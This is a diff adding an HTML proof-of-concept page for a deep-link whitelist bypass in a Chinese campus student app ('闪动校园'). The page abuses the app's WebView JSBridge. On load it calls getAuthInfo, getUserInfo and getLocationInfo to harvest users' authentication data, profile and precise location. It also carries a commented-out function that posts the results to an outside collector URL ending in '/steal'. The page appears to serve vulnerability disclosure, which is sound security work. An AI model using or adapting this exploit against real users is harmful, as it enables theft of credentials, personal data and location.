@@ -1,0 +1,68 @@
+<!doctype html>
+<html lang="zh">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>PoC</title>
+<link rel="stylesheet" href="https://unpkg.com/mdui@2/mdui.css">
+<script src="https://unpkg.com/mdui@2/mdui.global.js"></script>
+<style>
+  body{font:14px/1.6 -apple-system,sans-serif;margin:0;padding:72px 16px 16px;background:#fafafa;color:#222}
+  .wrap{max-width:720px;margin:0 auto;display:flex;flex-direction:column;gap:12px}
+  h2{font-size:18px;margin:4px 0 0;text-align:center;line-height:1.4}
+  mdui-card{padding:12px}
+  pre{margin:0;color:#333;white-space:pre-wrap;word-break:break-all;font-size:12px;font-family:ui-monospace,SFMono-Regular,Menlo,monospace}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <h2>闪动校园学生端<br>深链白名单绕过导致 JSBridge 越权调用<br>PoC</h2>
+  <mdui-card variant="outlined">
+    <pre id="log">loading...</pre>
+  </mdui-card>
+</div>
+
+<script>
+var COLLECTOR = "https://tyldx-huachenjie.com/steal";
+
+var logEl = document.getElementById("log");
+function log(line){ logEl.textContent += "\n" + line; }
+function exfil(tag, obj){
+  // try{
+  //   fetch(COLLECTOR, {method:"POST", headers:{"Content-Type":"application/json"},
+  //     body: JSON.stringify({tag:tag, data:obj, t:Date.now()})});
+  // }catch(e){}
+}
+
+function bridgeCall(method, arg, cb){
+  var payload = { data: (arg === undefined ? null : arg) };
+  if (typeof cb === "function"){
+    var n = "__dscb" + (window.__i = (window.__i||0)+1);
+    window[n] = function(ret){ try{ cb(ret); } finally { try{ delete window[n]; }catch(e){} } };
+    payload._dscbstub = n;
+  }
+  var r;
+  try { r = window._dsbridge.call(method, JSON.stringify(payload)); } catch(e){ log("call "+method+" err: "+e); return; }
+  return r ? JSON.parse(r).data : undefined;
+}
+
+function steal(method, arg){
+  bridgeCall(method, arg||{}, function(ret){
+    log(method + " => " + JSON.stringify(ret));
+    exfil(method, ret);
+  });
+}
+
+function start(){
+  if (!window._dsbridge){ log("没有 _dsbridge,未运行在目标 WebView 内"); return; }
+  logEl.textContent = "bridge ready";
+  steal("getAuthInfo");
+  steal("getUserInfo");
+  steal("getLocationInfo", {needAddress:true});
+}
+
+if (document.readyState !== "loading") start();
+else document.addEventListener("DOMContentLoaded", start);
+</script>
+</body>
+</html>
